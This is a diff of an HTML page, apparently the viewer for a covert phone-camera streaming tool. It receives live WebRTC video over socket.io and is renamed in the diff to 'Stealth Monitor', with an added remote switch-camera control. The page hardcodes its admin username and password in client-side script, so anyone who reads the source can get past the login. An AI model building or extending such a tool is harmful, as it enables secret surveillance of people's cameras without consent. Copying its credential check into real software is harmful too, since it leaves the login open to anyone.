@@ -3,93 +3,60 @@
 <head>
     <title>Secure Monitor</title>
     <style>
-        body { background: #111; color: white; font-family: sans-serif; text-align: center; margin: 0; }
-        #login-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #000; z-index: 1000; display: flex; flex-direction: column;
-            align-items: center; justify-content: center;
-        }
+        body { background: #111; color: white; text-align: center; font-family: sans-serif; }
+        #login-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
         .login-box { background: #222; padding: 30px; border-radius: 10px; border: 1px solid #f85606; }
-        input { padding: 10px; margin: 10px; width: 220px; border-radius: 5px; border: none; outline: none; }
+        input { padding: 10px; margin: 10px; width: 220px; border-radius: 5px; border: none; }
         button { padding: 12px 25px; background: #f85606; color: white; border: none; cursor: pointer; border-radius: 5px; font-weight: bold; }
-        
         #monitor-ui { display: none; padding: 20px; }
-        .monitor-box { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; }
-        .cam-container { width: 45%; min-width: 320px; background: #000; border-radius: 10px; border: 2px solid #333; padding: 10px; }
-        video { width: 100%; border-radius: 5px; background: #222; }
+        video { width: 80%; max-width: 700px; background: #000; border: 2px solid #333; border-radius: 10px; }
+        .btn-switch { padding: 15px 30px; background: red; color: white; border: none; border-radius: 50px; cursor: pointer; margin-top: 20px; font-weight: bold; }
     </style>
 </head>
 <body>
-
     <div id="login-overlay">
         <div class="login-box">
             <h2>🔒 Security Access</h2>
             <input type="text" id="user" placeholder="Username">
-            <input type="password" id="pass" placeholder="Password">
-            <br>
+            <input type="password" id="pass" placeholder="Password"><br>
             <button onclick="checkLogin()">Login & View</button>
-            <p id="err" style="color: red; font-size: 14px; margin-top: 10px;"></p>
+            <p id="err" style="color: red;"></p>
         </div>
     </div>
 
     <div id="monitor-ui">
-        <h2>🚀 Live Dual Monitor</h2>
-        <div class="monitor-box">
-            <div class="cam-container"><h3>👤 Front Cam</h3><video id="front" autoplay playsinline controls></video></div>
-            <div class="cam-container"><h3>🌍 Back Cam</h3><video id="back" autoplay playsinline controls></video></div>
-        </div>
+        <h2>🚀 Stealth Monitor</h2>
+        <video id="live" autoplay playsinline controls></video><br>
+        <button class="btn-switch" onclick="switchCam()">🔄 Switch Front/Back Camera</button>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        const DB_USER = "admin";
-        const DB_PASS = "rony25";
-        
-        let socket; 
-        const pcF = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-        const pcB = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+        const DB_USER = "admin", DB_PASS = "rony25";
+        let socket, pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
 
         function checkLogin() {
-            const u = document.getElementById("user").value;
-            const p = document.getElementById("pass").value;
-            
-            if (u === DB_USER && p === DB_PASS) {
+            if (document.getElementById("user").value === DB_USER && document.getElementById("pass").value === DB_PASS) {
                 document.getElementById("login-overlay").style.display = "none";
                 document.getElementById("monitor-ui").style.display = "block";
-                initSocket(); // Password milar por connection chalu hobe
-            } else {
-                document.getElementById("err").innerText = "Wrong Password!";
-            }
+                initSocket();
+            } else { document.getElementById("err").innerText = "Wrong!"; }
         }
 
         function initSocket() {
             socket = io();
-            
-            // 1. Join signal pathano
             socket.emit("ready");
-
-            // 2. Track gulo video box-e set kora
-            pcF.ontrack = e => { document.getElementById("front").srcObject = e.streams[0]; };
-            pcB.ontrack = e => { document.getElementById("back").srcObject = e.streams[0]; };
-
-            // 3. Signaling logic
+            pc.ontrack = e => { document.getElementById("live").srcObject = e.streams[0]; };
             socket.on("offer-front", async o => {
-                await pcF.setRemoteDescription(new RTCSessionDescription(o));
-                const a = await pcF.createAnswer();
-                await pcF.setLocalDescription(a);
+                await pc.setRemoteDescription(new RTCSessionDescription(o));
+                const a = await pc.createAnswer();
+                await pc.setLocalDescription(a);
                 socket.emit("answer-front", a);
             });
-
-            socket.on("offer-back", async o => {
-                await pcB.setRemoteDescription(new RTCSessionDescription(o));
-                const a = await pcB.createAnswer();
-                await pcB.setLocalDescription(a);
-                socket.emit("answer-back", a);
-            });
-
-            socket.on("ice-front", c => pcF.addIceCandidate(new RTCIceCandidate(c)));
-            socket.on("ice-back", c => pcB.addIceCandidate(new RTCIceCandidate(c)));
+            socket.on("ice-front", c => pc.addIceCandidate(new RTCIceCandidate(c)));
         }
+
+        function switchCam() { socket.emit("switch-camera"); }
     </script>
 </body>
 </html>
